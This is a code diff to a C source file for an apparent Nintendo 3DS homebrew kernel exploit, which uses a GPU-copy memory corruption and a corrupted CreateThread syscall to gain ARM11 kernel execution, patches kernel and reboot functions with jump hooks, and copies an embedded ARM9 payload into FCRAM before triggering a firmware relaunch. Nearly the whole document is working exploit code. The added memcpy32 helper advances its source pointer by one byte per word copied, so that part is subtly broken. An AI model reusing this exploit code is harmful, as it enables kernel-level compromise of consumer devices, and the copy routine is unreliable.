@@ -1,13 +1,13 @@
 #include <3ds.h>
+#include <stddef.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 #include <malloc.h>
 #include <dirent.h>
 
-#include "utils.h"
+#include "payload_bin.h"
 
-u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 unsigned int patch_addr;
 unsigned int svc_patch_addr;
 unsigned int reboot_patch_addr;
@@ -19,28 +19,20 @@ unsigned int func_patch_return;
 unsigned int fcram_addr;
 unsigned int pdn_regs;
 unsigned int pxi_regs;
-unsigned char patched_svc = 0;
 unsigned int kversion;
 
 unsigned char *framebuff_top_0;
 unsigned char *framebuff_top_1;
 
 u8 isN3DS = 0;
-u8 backupHeap = 0;
-u32 *backup;
 
 unsigned int *arm11_buffer;
-unsigned int *arm9_payload;
-unsigned int arm9_payload_size;
 extern void* jump_table asm("jump_table");
 extern void* pdn_regs_0 asm("pdn_regs_0");
 extern void* pxi_regs_0 asm("pxi_regs_0");
 extern void* return_location asm("return_location");
 extern void* reboot_wait asm("reboot_wait");
 extern void* end_jump_table asm("end_jump_table");
-extern void InvalidateEntireInstructionCache();
-extern void InvalidateEntireDataCache();
-extern void memcpy_asm(void *dest, const void *src, size_t n);
 
 // Uncomment to have progress printed w/ printf
 //#define DEBUG_PROCESS
@@ -50,6 +42,25 @@ extern void memcpy_asm(void *dest, const void *src, size_t n);
 #else
 #define dbg_log(...)
 #endif
+
+static void *memcpy32(void *dst, const void *src, size_t n)
+{
+	int32_t *p;
+
+	p = dst;
+
+	if (dst == NULL || src == NULL)
+		return p;
+
+	while (n) {
+		*p = *(int32_t *)src;
+		p++;
+		src++;
+		n -= sizeof(int32_t);
+	}
+
+	return dst;
+}
 
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
@@ -269,23 +280,7 @@ int arm11_kernel_exploit_setup(void)
 	dbg_log("Restoring heap\n");
 	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
 
-	// Part 2: trick to clear icache
-	build_nop_slide(arm11_buffer, 0x1000);
-	do_gshax_copy(nop_slide, arm11_buffer, 0x1000);
-	HB_FlushInvalidateCache();
-
-	((void (*)(void))nop_slide)();
-	dbg_log("Executed nop slide\n");
-
 	return 1;
-}
-
-// after running setup, run this to execute func in ARM11 kernel mode
-int __attribute__((naked))
-arm11_kernel_exploit_exec (int (*func)(void))
-{
-	asm volatile ("svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
-				  "bx lr \t\n");
 }
 
 
@@ -315,26 +310,21 @@ arm11_firmlaunch_hax(void)
 	int (*trigger_func)(int, int, int, int) = trigger_func_addr;
 	dot();
 
-	InvalidateEntireInstructionCache();
 	framebuff_top_0[7] = 0xFF;
 	framebuff_top_1[7] = 0xFF;
-	InvalidateEntireDataCache();
 
 	dot();
-	InvalidateEntireDataCache();
 
 	// ARM9 code copied to FCRAM 0x23F00000
-	memcpy_asm(fcram_addr + 0x3F00000, arm9_payload, arm9_payload_size);
+	memcpy32(fcram_addr + 0x3F00000, payload_bin, payload_bin_size);
 
 	dot();
-	InvalidateEntireDataCache();
 
 	// write function hook at 0xFFFF0C80
-	memcpy_asm(jump_table_addr, &jump_table, (&end_jump_table - &jump_table + 1) * 4);
+	memcpy32(jump_table_addr, &jump_table, (&end_jump_table - &jump_table + 1) * 4);
 	//dbg_log("%x = %x\n", jump_table_addr, *(u32*)jump_table_addr);
 
 	dot();
-	InvalidateEntireDataCache();
 
 	// write FW specific offsets to copied code buffer
 	//dbg_log("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));
@@ -344,14 +334,12 @@ arm11_firmlaunch_hax(void)
 	//dbg_log("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));
 
 	dot();
-	InvalidateEntireDataCache();
 
 	// patch function 0xFFF84D90 to jump to our hook
 	*(int *)(func_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
 	*(int *)(func_patch_addr + 4) = 0xFFFF0C80; // jump_table + 0
 
 	dot();
-	InvalidateEntireDataCache();
 
 	// patch reboot start function to jump to our hook
 	*(int *)(reboot_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
@@ -360,14 +348,17 @@ arm11_firmlaunch_hax(void)
 	framebuff_top_0[42+1] = 0xFF;
 	framebuff_top_1[42+1] = 0xFF;
 	dotNum += 6;
-	InvalidateEntireDataCache();
 
-	InvalidateEntireInstructionCache();
+	__asm__ volatile(
+		"mov r0, #0\n"
+		"mcr p15, 0, r0, c7, c10, 5\n" // Invalidate Icache
+		"mcr p15, 0, r0, c7, c5, 4\n" // Clear Dcache
+		::: "r0");
+
 	framebuff_top_0[48+2] = 0xFF;
 	framebuff_top_1[48+2] = 0xFF;
 	dotNum += 6;
 
-	InvalidateEntireDataCache();
 	trigger_func(0, 0, 2, 0); // trigger reboot
 	while(1){}
 
@@ -381,13 +372,6 @@ bool doARM11Hax()
 {
 	int result = 0;
 	int i;
-
-	HB_ReprotectMemory(nop_slide, 4, 7, &result);
-	build_nop_slide(nop_slide, 0x1000);
-	HB_FlushInvalidateCache();
-
-	((void (*)(void))nop_slide)();
-	dbg_log("Executed test nop slide\n");
 
 	arm11_buffer = linearMemAlign(0x10000, 0x10000);
 
@@ -403,14 +387,12 @@ bool doARM11Hax()
 	dbg_log("Jump table vars 0x%x after jump table\n", (&pdn_regs_0 - &jump_table)*4);
 	dbg_log("Reboot wait at %x\n", 0x1FFF4C80 + (&reboot_wait - &jump_table)*4);
 
-	if (arm11_kernel_exploit_setup())
-	{
-		dbg_log("Kernel exploit set up\n");
+	while (1)
+		if (arm11_kernel_exploit_setup())
+			asm volatile ("ldr r0, =%0\t\n"
+				"svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
+				:: "i"(arm11_firmlaunch_hax)
+				: "r0");
 
-		arm11_kernel_exploit_exec(arm11_firmlaunch_hax);
-		dbg_log("ARM11 code passed somehow, ARM9 failed...\n");
-	}
-
-    dbg_log("Kernel exploit set up failed!\n\n");
 	return false;
 }
